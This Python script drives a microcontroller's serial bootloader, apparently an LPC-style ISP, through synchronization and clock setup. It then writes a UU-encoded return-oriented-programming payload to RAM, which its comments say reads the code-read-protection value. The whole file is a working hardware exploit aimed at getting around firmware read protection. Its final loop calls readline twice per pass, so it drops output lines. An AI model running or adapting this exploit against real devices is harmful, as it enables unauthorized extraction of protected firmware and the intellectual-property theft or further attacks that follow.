import time
import serial as ser
import uu

EOL = b"\r\n"

SER_PORT = "/dev/ttyAMA0"

def open_port(serial, baud):
	print(f"Serial communication opened on port {serial} at {baud} baud.")
	return ser.Serial(serial, baud, timeout=1)

def send_exploit(serial, khz):

	################################## Syncing the Device ############################################
	serial.write(b"?")
	print("synchronization handshake initiated... ")

	if serial.readline() == b"Synchronized" + EOL:
		serial.write(b"Synchronized" + EOL)
	else:
		print("Synchronization failed. No response from target device.")
		return False

	clk = str(khz).encode('UTF-8')   
	if serial.readline() == b"Synchronized\rOK" + EOL:
		print("Synchronized with target device.")
		print("Setting device clock freq... ")

		serial.write(clk + EOL)
	else:
	 
		print("Synchronization failed. Target aborted synchronization.")
		return False

	if serial.readline() == clk + b"\rOK" + EOL:
		print("Clock frequency set at %.3f Mhz" % (khz / 1000.0))
	else:
		print("Failed to set clock frequency to %.3f Mhz" % (khz / 1000.0))
		return False
  
	print("Communications setup with target device succeeded. \n")

	################################## Ssending the Exploit ############################################

	print("Applying ROP Exploiting...... :) \n")

	time.sleep(1)

	#Call the Write To RAM Command
	serial.write(b"W 268443476 44" + EOL)

	#Send the Exploit (read CRP value)
	serial.write(b"""L^PS_'____________`(``+L0_Q^[$/\\?NQ#_'[L0_Q]_$?\\?`````($._Q\\`""" + EOL)

	#Send Bytes' checksum
	serial.write(b"5658" + EOL)

	time.sleep(1)

	#Print Exploit results
	print("\n ############ UU-encoded Exploit Result ############## \n")
	while serial.readline()!=b"":
		print(serial.readline().decode('utf-8'))
		
	return True

def close_port(serial):
	serial.close()

if __name__=="__main__":
	port = open_port(SER_PORT, 115200)
	send_exploit(port, 12000)
	close_port(port)




